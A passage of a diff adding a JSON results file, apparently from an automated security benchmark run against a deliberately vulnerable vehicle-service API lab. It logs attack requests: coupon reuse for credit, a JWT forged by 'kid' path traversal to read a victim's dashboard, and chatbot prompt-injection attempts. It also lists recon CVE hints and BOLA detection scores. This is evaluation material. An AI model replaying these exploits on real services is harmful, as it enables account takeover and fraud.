+            "status": 400,
+            "snippet": "{\"message\":\"Coupon not found\"}"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/shop/apply_coupon",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0xNjhjZjdkMEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkwODE2OTA4LCJyb2xlIjoidXNlciJ9.Xq8oyqQC_W3fC2v9uFItR8PKjggOT8tExRwf4SqlHMVl3qbdueUwrJlb3XL3rCk0tcWUN9ldmxBKnmlPGAWy1uvqtFV1nZoWgpvcH5XDRNuFNDHR6ixd19yAEU0ar2hlmkTlHU_h78BntKy9pW5ylGUsvc0f3jqu6Kk2uni1iwrA0SJZmlpBd3-macV4SgWH0B221tor_xNa0u5G15mS-8qrOATH7trdQ1jqQeVhPQOEp7QDeNz3Wi1-Xwj9Gt5esmV6kCP8suPqyNbX4vozVRUj2BXlbeM1J9WmaYYWhyOnNgLmydILgQ6cOSP3c5aLy0yYrg9LrhIKbk9EZ4h_9w",
+              "body": {
+                "coupon_code": "TRAC075",
+                "amount": 75
+              }
+            },
+            "status": 200,
+            "snippet": "{\"credit\":250.0,\"message\":\"Coupon successfully applied!\"}"
+          }
+        ],
+        "evidence": "first=200 second=400 third=200 {\"credit\":250.0,\"message\":\"Coupon successfully applied!\"}"
+      },
+      {
+        "challenge": "ch14_unauthenticated",
+        "solved": true,
+        "requests": 1,
+        "seconds": 0.01,
+        "audit": [
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/workshop/api/mechanic/receive_report",
+              "token": ""
+            },
+            "status": 400,
+            "snippet": "{\"mechanic_code\":[\"This field is required.\"],\"problem_details\":[\"This field is required.\"],\"vin\":[\"This field is require"
+          }
+        ],
+        "evidence": "{\"mechanic_code\":[\"This field is required.\"],\"problem_details\":[\"This field is required.\"],\"vin\":[\"This field is required.\"]}"
+      },
+      {
+        "challenge": "ch15_jwt_forge",
+        "solved": true,
+        "requests": 6,
+        "seconds": 0.34,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Victim",
+              "email": "victim-b16cb231@example.com",
+              "number": "9346230387"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-b16cb231@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tYjE2Y2IyMzFAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMTAsImV4cCI6MTc5MDgx"
+          },
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-c474ac3e@example.com",
+              "number": "9875951090"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-c474ac3e@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci1jNDc0YWMzZUBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjExMCwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "forge_jwt",
+            "params": {
+              "sub": "victim-b16cb231@example.com",
+              "technique": "kid_path_traversal"
+            },
+            "status": 0,
+            "snippet": ""
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/identity/api/v2/user/dashboard",
+              "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJ2aWN0aW0tYjE2Y2IyMzFAZXhhbXBsZS5jb20iLCJyb2xlIjoidXNlciJ9.XzsgCxkfK3AbGPuxdpjWm8nqK9k-bdurhk6vh2Wb7Po"
+            },
+            "status": 200,
+            "snippet": "{\"id\":525,\"name\":\"Victim\",\"email\":\"victim-b16cb231@example.com\",\"number\":\"9346230387\",\"picture_url\":null,\"video_url\":nul"
+          }
+        ],
+        "evidence": "{\"id\":525,\"name\":\"Victim\",\"email\":\"victim-b16cb231@example.com\",\"number\":\"9346230387\",\"picture_url\":null,\"video_url\":null,\"video_name\":null,\"available_credit\":100.0,\"video_id\":0,\"role\":\"ROLE_USER\"}"
+      },
+      {
+        "challenge": "ch16_llm_prompt_injection",
+        "solved": false,
+        "requests": 3,
+        "seconds": 1.27,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-1f5bbafd@example.com",
+              "number": "9976282598"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-1f5bbafd@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0xZjViYmFmZEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjExMCwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "chatbot_ask",
+            "status": 200,
+            "snippet": "Error code: 402 - {'error': {'message': 'litellm.BadRequestError: DeepseekException - {\"error\":{\"message\":\"Insufficient "
+          }
+        ],
+        "evidence": "Error code: 402 - {'error': {'message': 'litellm.BadRequestError: DeepseekException - {\"error\":{\"message\":\"Insufficient Balance\",\"type\":\"unknown_error\",\"param\":null,\"code\":\"invalid_request_error\"}}. Received Model Group=flash\\nAvailable Model Group Fallbacks=None', 'type': 'invalid_request_error', '"
+      },
+      {
+        "challenge": "ch17_llm_extract_creds",
+        "solved": false,
+        "requests": 3,
+        "seconds": 1.39,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-dd72d501@example.com",
+              "number": "9782506549"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-dd72d501@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci1kZDcyZDUwMUBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjExMSwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "chatbot_ask",
+            "status": 200,
+            "snippet": "Error code: 402 - {'error': {'message': 'litellm.BadRequestError: DeepseekException - {\"error\":{\"message\":\"Insufficient "
+          }
+        ],
+        "evidence": "Error code: 402 - {'error': {'message': 'litellm.BadRequestError: DeepseekException - {\"error\":{\"message\":\"Insufficient Balance\",\"type\":\"unknown_error\",\"param\":null,\"code\":\"invalid_request_error\"}}. Received Model Group=flash\\nAvailable Model Group Fallbacks=None', 'type': 'invalid_request_error', '"
+      },
+      {
+        "challenge": "ch18_llm_act_as_user",
+        "solved": true,
+        "requests": 4,
+        "seconds": 1.95,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-925b3fd4@example.com",
+              "number": "9657719148"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-925b3fd4@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci05MjViM2ZkNEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjExMywiZXhwIjoxNzkw"
+          },
+          {
+            "op": "chatbot_ask",
+            "status": 200,
+            "snippet": "Error code: 402 - {'error': {'message': 'litellm.BadRequestError: DeepseekException - {\"error\":{\"message\":\"Insufficient "
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/community/api/v2/community/posts/recent",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci05MjViM2ZkNEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjExMywiZXhwIjoxNzkwODE2OTEzLCJyb2xlIjoidXNlciJ9.AB10A7b3xc-rHVXrt26iCFLd8XhFXxfW6MkgFdBDH4N_9B5JEf6SoM_108vpaLt5VwP-F_JZRQDIhfKysfFFuAzbUWkM12EIs5n6lph6zrV-ApCb_MXQ0t8rf8nLYoIHlc29u9aMANwRQddCaXB2OOH_5mFhTWFjARjMWpybLjG2kutvTyq85zcBR7Bmj7WBDPtu89L2R4zSS-CFOCaE6swk7sL0Me1-CXpV6KolN4awtKQiRLtamElmV8u7O5AEhbwCYgUikcrbFFeO_dh3iojXcGhD-iUc_DwHohPkaqrkozH5ESpSfQ-y7BkFI_O4__M5engymAkR9Wd7M50psQ"
+            },
+            "status": 200,
+            "snippet": "{\"posts\":[{\"id\":\"xb9NBg3d2JRjPEThdbAXE7\",\"title\":\"Title 3\",\"content\":\"Hello world 3\",\"author\":{\"nickname\":\"Robot\",\"email"
+          }
+        ],
+        "evidence": "{\"posts\":[{\"id\":\"xb9NBg3d2JRjPEThdbAXE7\",\"title\":\"Title 3\",\"content\":\"Hello world 3\",\"author\":{\"nickname\":\"Robot\",\"email\":\"robot001@example.com\",\"vehicleid\":\"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5\",\"profile_pic_url\":\"\",\"created_at\":\"2026-09-23T00:27:19.267Z\"},\"comments\":[],\"authorid\":3,\"CreatedAt\":\"20"
+      }
+    ]
+  },
+  "recon": {
+    "hosts": [
+      {
+        "ip": "10.0.0.1",
+        "hostname": "gw",
+        "services": [
+          {
+            "port": 22,
+            "proto": "tcp",
+            "service": "ssh",
+            "product": "OpenSSH",
+            "version": "7.2"
+          }
+        ]
+      },
+      {
+        "ip": "10.0.0.5",
+        "hostname": "web",
+        "services": [
+          {
+            "port": 80,
+            "proto": "tcp",
+            "service": "http",
+            "product": "Apache httpd",
+            "version": "2.4.49"
+          },
+          {
+            "port": 443,
+            "proto": "tcp",
+            "service": "https",
+            "product": "Apache httpd",
+            "version": "2.4.49"
+          }
+        ]
+      },
+      {
+        "ip": "10.0.0.10",
+        "hostname": "ftp",
+        "services": [
+          {
+            "port": 21,
+            "proto": "tcp",
+            "service": "ftp",
+            "product": "vsftpd",
+            "version": "2.3.4"
+          }
+        ]
+      },
+      {
+        "ip": "10.0.0.5",
+        "hostname": "",
+        "services": [
+          {
+            "port": 80,
+            "proto": "tcp",
+            "service": "",
+            "product": "",
+            "version": ""
+          },
+          {
+            "port": 443,
+            "proto": "tcp",
+            "service": "",
+            "product": "",
+            "version": ""
+          }
+        ]
+      },
+      {
+        "ip": "10.0.0.10",
+        "hostname": "",
+        "services": [
+          {
+            "port": 21,
+            "proto": "tcp",
+            "service": "",
+            "product": "",
+            "version": ""
+          }
+        ]
+      },
+      {
+        "ip": "10.0.0.12",
+        "hostname": "",
+        "services": [
+          {
+            "port": 3306,
+            "proto": "tcp",
+            "service": "",
+            "product": "",
+            "version": ""
+          }
+        ]
+      }
+    ],
+    "cve_hints": [
+      {
+        "host": "10.0.0.1",
+        "port": 22,
+        "version": "OpenSSH 7.2",
+        "hypothesis": "CVE-2016-6210 (user enumeration)",
+        "cve_ids": [
+          "CVE-2016-6210"
+        ],
+        "kev": false,
+        "epss": 0.0
+      },
+      {
+        "host": "10.0.0.5",
+        "port": 80,
+        "version": "Apache httpd 2.4.49",
+        "hypothesis": "CVE-2021-41773 (path traversal)",
+        "cve_ids": [
+          "CVE-2021-41773"
+        ],
+        "kev": false,
+        "epss": 0.0
+      },
+      {
+        "host": "10.0.0.5",
+        "port": 443,
+        "version": "Apache httpd 2.4.49",
+        "hypothesis": "CVE-2021-41773 (path traversal)",
+        "cve_ids": [
+          "CVE-2021-41773"
+        ],
+        "kev": false,
+        "epss": 0.0
+      },
+      {
+        "host": "10.0.0.10",
+        "port": 21,
+        "version": "vsftpd 2.3.4",
+        "hypothesis": "CVE-2011-2523 (backdoor)",
+        "cve_ids": [
+          "CVE-2011-2523"
+        ],
+        "kev": false,
+        "epss": 0.0
+      }
+    ],
+    "shadow_endpoints": [
+      "/admin",
+      "/api",
+      "/health",
+      "/internal",
+      "/login"
+    ]
+  },
+  "bola": {
+    "n": 44,
+    "n_vulnerable": 9,
+    "tp": 9,
+    "fp": 1,
+    "fn": 0,
+    "tn": 34,
+    "precision": 0.9,
+    "recall": 1.0,
+    "f1": 0.9473684210526316,
+    "vulnerable_authenticated": 9,
+    "false_positives": [
+      "GET /identity/api/v2/user/videos/convert_video"
+    ],
+    "false_negatives": [],
+    "rows": [
+      {
+        "key": "POST /identity/api/auth/signup",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      },
+      {
+        "key": "POST /identity/api/auth/login",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      },
+      {
+        "key": "POST /identity/api/auth/forget-password",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      },
+      {
+        "key": "POST /identity/api/auth/v3/check-otp",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      },
+      {
+        "key": "POST /identity/api/auth/v2/check-otp",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      },
+      {
+        "key": "POST /identity/api/auth/v4.0/user/login-with-token",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      },
+      {
+        "key": "POST /identity/api/auth/v2.7/user/login-with-token",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      },
+      {
+        "key": "POST /identity/api/v2/user/reset-password",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /identity/api/v2/user/change-email",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /identity/api/v2/user/verify-email-token",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /identity/api/v2/user/dashboard",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /identity/api/v2/user/pictures",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /identity/api/v2/user/videos",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /identity/api/v2/user/videos/{video_id}",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "PUT /identity/api/v2/user/videos/{video_id}",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "DELETE /identity/api/v2/user/videos/{video_id}",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "GET /identity/api/v2/user/videos/convert_video",
+        "vulnerable": false,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "DELETE /identity/api/v2/admin/videos/{video_id}",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "GET /identity/api/v2/vehicle/vehicles",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /identity/api/v2/vehicle/add_vehicle",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /identity/api/v2/vehicle/{vehicleId}/location",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "POST /identity/api/v2/vehicle/resend_email",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /community/api/v2/community/posts/{postId}",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /community/api/v2/community/posts",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /community/api/v2/community/posts/{postId}/comment",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /community/api/v2/community/posts/recent",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /community/api/v2/coupon/new-coupon",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /community/api/v2/coupon/validate-coupon",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /workshop/api/shop/products",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /workshop/api/shop/products",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /workshop/api/shop/orders",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "PUT /workshop/api/shop/orders/{order_id}",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "GET /workshop/api/shop/orders/{order_id}",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "GET /workshop/api/shop/orders/all",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /workshop/api/shop/orders/return_order",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "POST /workshop/api/shop/apply_coupon",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /workshop/api/shop/return_qr_code",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /workshop/api/management/users/all",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /workshop/api/mechanic/",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /workshop/api/merchant/contact_mechanic",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "GET /workshop/api/mechanic/receive_report",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      },
+      {
+        "key": "GET /workshop/api/mechanic/mechanic_report",
+        "vulnerable": true,
+        "predicted": true,
+        "authenticated": true
+      },
+      {
+        "key": "GET /workshop/api/mechanic/service_requests",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": true
+      },
+      {
+        "key": "POST /workshop/api/mechanic/signup",
+        "vulnerable": false,
+        "predicted": false,
+        "authenticated": false
+      }
+    ]
+  }
+}
